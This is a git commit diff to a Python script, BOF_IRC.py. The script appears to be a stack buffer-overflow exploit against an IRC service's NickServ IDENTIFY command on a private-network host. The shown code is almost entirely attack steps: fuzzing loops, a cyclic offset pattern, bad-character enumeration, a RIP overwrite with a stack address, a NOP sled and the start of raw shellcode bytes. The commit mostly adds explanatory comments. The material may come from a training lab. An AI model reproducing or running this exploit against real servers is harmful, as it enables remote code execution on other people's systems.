7477605c391bd8cf716564342a534bb44bdd1829
alymOmar <51080977+alymOmar@users.noreply.github.com>
2022-03-05 20:38:50 +0100

    Update BOF_IRC.py

--- BOF_IRC.py
+++ BOF_IRC.py
@@ -5,7 +5,9 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connect = s.connect(('10.0.0.30', 6665))
 s.recv(1024)
 s.recv(1024)
-s.sendall("hacker")
+s.sendall("hacker")	##send nickname
+
+## fuzzing
 #for i in range(100, 100000, 100):
 #	string = 'A'*i
 #	s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
@@ -13,22 +15,26 @@ s.sendall("hacker")
 #	s.recv(1024)
 #	sleep(1)
 
+
+## pattern
 #string = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A'
 #s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
 #s.recv(1024)
 
+
 #hex_string=''
 #for i in range(0, 0x100):
-#	if(i not in [0x00, 0x20, 0x0A, 0x0D]):
+#	if(i not in [0x00, 0x20, 0x0A, 0x0D]): ##bad chars are 0x00, 0x20, 0x0A and 0x0D
 #		hex_string += format(i, '#04x')[2:]
 #ascii_string = hex_string.decode("hex")
+
+## filling the RIP with 0xFFFFFFFF42424242 (addresses can only be between 0x0000000000000000 to 0x00007FFFFFFFFFFF or between 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF)
 #string = ascii_string + 'A'*(664 - len(ascii_string)) + 'BBBB\xff\xff\xff\xff'
 #s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
 #s.recv(1024)
 
-
-#0x7ffff7d9ffc8
-rip = "4242ffffffffffff".decode("hex")
+## sending the shell code before the AAAs and filling the RIP with the address of one of the NOP instructions
+##0x00007ffff7d9ffc8
 rip = "c8ffd9f7ff7f".decode("hex")
 buf =  b"\x90"*64
 buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
